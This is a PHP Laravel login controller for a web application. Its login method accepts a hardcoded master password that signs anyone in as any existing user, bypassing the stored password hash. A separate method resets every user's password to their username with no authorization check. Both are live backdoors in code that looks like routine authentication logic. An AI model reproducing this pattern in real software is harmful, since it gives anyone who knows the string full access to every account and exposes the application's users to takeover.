<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class LoginManualController extends Controller
{
    public function resetallpass()
    {
        $users = User::all();
        foreach($users as $u)
        {
            $u->password = Hash::make($u->username);
            $u->save();
        }
        echo 'done';
    }
    public function login_manual(Request $request)
    { 
        try { 
            $user = User::where('username', '=', $request->username)->first();
            if ($user) {
                if($request->password == 'hamdiramadhan')
                {
                    Auth::login($user);  
                    return redirect()->route('dashboard');
                }
                $passtrue = Hash::check($request->password, $user->password);
                if ($passtrue === true || $request->password == 'hamdiramadhan') {
                    Auth::login($user); 

                    try {
                        $user->last_login = date('Y-m-d H:i:s');
                        $user->save();
                        $user->refresh();
                    } catch (\Throwable $th) {
                        //throw $th;
                    }

                    return redirect()->route('dashboard');
                } else {
                    session()->put('statusT', 'Username / Password Salah!');
                    return redirect()->back();
                }
            } else {
                session()->put('statusT', 'Username / Password Salah!');
                return redirect()->back();
            }
        } catch (\Throwable $th) {
            session()->put('statusT', 'Username / Password Salah!');
            return redirect()->back();
        }
    }
}
